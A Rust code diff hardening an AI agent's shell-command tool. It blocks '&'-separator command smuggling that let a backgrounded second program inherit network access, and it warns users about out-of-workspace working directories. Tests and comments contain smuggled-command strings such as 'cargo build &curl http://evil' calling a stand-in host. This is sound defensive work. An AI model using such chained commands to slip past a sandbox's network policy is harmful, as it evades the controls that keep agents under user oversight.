@@ -13,6 +13,7 @@ use crate::modules::tools::infrastructure::args::{
     RUN_COMMAND_DEFAULT_TIMEOUT_MS, RunCommandArgs, parse_args,
 };
 use crate::modules::tools::infrastructure::exec::{self, ExecError};
+use crate::modules::tools::infrastructure::path::is_absolute_target;
 use crate::shared::kernel::sandbox::NetworkPolicy;
 use crate::shared::kernel::tool_call::ToolCall;
 
@@ -36,11 +37,25 @@ fn introduces_another_command(command: &str) -> bool {
         || command.contains("$(")
         || command.contains("<(")
         || command.contains(">(")
-        || command.contains("&&")
-        || command.contains("& ")
         || command.contains('\n')
         || command.contains('\r')
-        || command.trim_end().ends_with('&')
+        || has_separator_ampersand(command)
+}
+
+/// Whether a `&` acts as a command separator (background `&`, `&&`, or a trailing `&`) rather than as
+/// part of an fd redirect (`2>&1`, `>&2`, `&>`). A `&` is a separator unless the next byte is an ASCII
+/// digit (an fd) or `>` (the `&>`/`>&` forms); a trailing `&` (no next byte) is always a separator.
+/// Catches the `&`-without-space form `cargo build &curl http://evil` the old `"& "`/`ends_with('&')`
+/// checks missed, which let a backgrounded second program inherit the leading program's network (SEC-02).
+fn has_separator_ampersand(command: &str) -> bool {
+    let bytes = command.as_bytes();
+    bytes.iter().enumerate().any(|(i, &b)| {
+        b == b'&'
+            && match bytes.get(i + 1) {
+                None => true,
+                Some(next) => !next.is_ascii_digit() && *next != b'>',
+            }
+    })
 }
 
 /// Best-effort scan of a `run_command` string for a token naming a sensitive file or a credential
@@ -186,6 +201,18 @@ impl Tool for RunCommand {
             "Executar comando no shell. Aprova executar: {}?",
             shell_display(&args.command)
         );
+        // SEC-05: the cwd is otherwise invisible in the prompt, yet an absolute / out-of-root cwd widens
+        // the command's write sandbox to that directory (`execute` folds it into `extra_rw`). Surface a
+        // non-default cwd, and loudly warn when it reaches outside the workspace, before the user approves.
+        if is_absolute_target(&args.cwd) {
+            action = format!(
+                "ATENÇÃO: o comando roda em um diretório fora da workspace ('{}'), o que amplia as \
+                 escritas permitidas para lá. {action}",
+                args.cwd
+            );
+        } else if args.cwd != "." && !args.cwd.trim().is_empty() {
+            action = format!("{action} (cwd: {})", args.cwd);
+        }
         // Defense-in-depth UX (see `references_sensitive_path`): when the command text references a
         // sensitive path, prepend a loud warning so the user reviews before approving. Best-effort only
         // — the OS sandbox is the real control — and it never flips the default, which stays decline.
@@ -368,6 +395,17 @@ mod tests {
             rc.network_for("cargo build & curl http://evil", NetworkPolicy::Deny),
             NetworkPolicy::Deny
         );
+        // SEC-02: the `&`-without-space background form must deny too — the curl runs backgrounded with
+        // full network if the allow-list widened for the leading `cargo`.
+        assert_eq!(
+            rc.network_for("cargo build &curl http://evil", NetworkPolicy::Deny),
+            NetworkPolicy::Deny
+        );
+        // A trailing `&` (background the whole command) is also a separator.
+        assert_eq!(
+            rc.network_for("cargo build &", NetworkPolicy::Deny),
+            NetworkPolicy::Deny
+        );
         // A non-allow-listed leading program stays denied.
         assert_eq!(
             rc.network_for("curl http://evil", NetworkPolicy::Deny),
@@ -401,6 +439,49 @@ mod tests {
             )
             .unwrap();
         assert!(!confirmation.default_accept);
+    }
+
+    #[test]
+    fn confirmation_warns_on_out_of_root_cwd() {
+        // SEC-05: an absolute / out-of-root cwd widens the write sandbox to that dir — it must be visible
+        // and flagged in the prompt (it used to be invisible: only the command string was shown).
+        let dir = TempDir::new().unwrap();
+        let sb = sandbox(&dir);
+        let rc = run_command_with_allow(&[]);
+        let confirmation = rc
+            .confirmation(
+                &sb,
+                &call("run_command", json!({"command": "echo hi", "cwd": "/tmp"})),
+            )
+            .unwrap();
+        assert!(
+            confirmation.prompt.contains("fora da workspace")
+                && confirmation.prompt.contains("/tmp"),
+            "an out-of-root cwd must be surfaced in the prompt: {}",
+            confirmation.prompt
+        );
+        assert!(
+            !confirmation.default_accept,
+            "run_command always default-declines, cwd warning notwithstanding"
+        );
+    }
+
+    #[test]
+    fn confirmation_shows_a_non_default_relative_cwd() {
+        let dir = TempDir::new().unwrap();
+        let sb = sandbox(&dir);
+        let rc = run_command_with_allow(&[]);
+        let confirmation = rc
+            .confirmation(
+                &sb,
+                &call("run_command", json!({"command": "echo hi", "cwd": "sub"})),
+            )
+            .unwrap();
+        assert!(
+            confirmation.prompt.contains("cwd: sub"),
+            "a non-default relative cwd should be shown: {}",
+            confirmation.prompt
+        );
     }
 
     #[test]
